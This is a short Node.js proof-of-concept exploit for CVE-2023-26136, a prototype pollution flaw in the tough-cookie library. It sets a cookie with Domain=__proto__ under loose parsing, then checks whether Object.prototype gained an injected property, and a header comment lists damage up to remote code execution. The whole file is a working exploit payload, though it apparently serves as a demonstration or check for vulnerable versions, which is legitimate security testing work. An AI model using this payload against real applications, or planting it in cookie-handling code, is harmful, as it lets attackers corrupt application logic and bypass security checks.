/*
CVE-2023-26136 - Prototype Pollution:
Object.prototype properties injection via cookie manipulation

Potential Damage:
- Corrupts application logic
- Bypasses security checks
- Leaks sensitive data
- Enables remote code execution
*/
async function main() {
  try {
    const tough = require("tough-cookie");
    const jar = new tough.CookieJar(undefined, {
      rejectPublicSuffixes: false, // Rejects cookies with domains like "com" and "co.uk"
      looseMode: true // Allows cookies like `bar` and `=bar` which have an implied empty name
    });

    // Tries to pollute the prototype by setting a cookie with Domain=__proto__
    await new Promise((resolve, reject) => {
      jar.setCookie(
        "Slonser=polluted; Domain=__proto__; Path=/notauth",
        "https://__proto__/admin",
        (err, cookie) => (err ? reject(err) : resolve(cookie))
      );
    });

    // Checks if the prototype was polluted by looking for an injected property
    const pollutedObject  = {};
    if (pollutedObject["/notauth"] === undefined) {
      throw new Error("CVE-2023-26136: Prototype Pollution");
    }

    console.log("EXPLOITED SUCCESSFULLY");
  } catch {
    console.log("EXPLOIT FAILED");
  }
}

main();
